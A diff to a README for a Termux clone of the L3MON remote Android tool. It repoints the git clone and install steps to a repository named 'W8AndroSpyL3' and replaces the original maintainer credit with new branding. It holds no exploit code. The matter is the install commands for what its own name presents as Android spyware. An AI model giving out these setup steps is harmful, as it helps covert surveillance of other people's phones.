@@ -26,8 +26,8 @@ Clone of real <a href="https://www.facebook.com/W8Vai">L3MON</a> a cloud based r
 ## Installation
 ```
      cd $HOME
-     git clone https://github.com/rootuserdj/L3MON-Termux.git
-     cd L3MON-Termux
+     git clone https://github.com/W8SOJIB/W8AndroSpyL3
+     cd W8AndroSpyL3
      bash install.sh
 ```
   
@@ -38,8 +38,8 @@ Clone of real <a href="https://www.facebook.com/W8Vai">L3MON</a> a cloud based r
 
 
 
-<p align="center">L3MON Termux Managed and maintained by ❤️ <a href="@hack3rdj">Dhananjay Sah</a></p>
-<p align="center" style="font-size: 8px">L3MON Termux v2.1.0</p>
+<p align="center">W8SOJIB Managed and maintained by ❤️ <a href="https://www.facebook.com/W8Vai">W8SOJIB</a></p>
+<p align="center" style="font-size: 15px">W8Team</p>
 
 
 
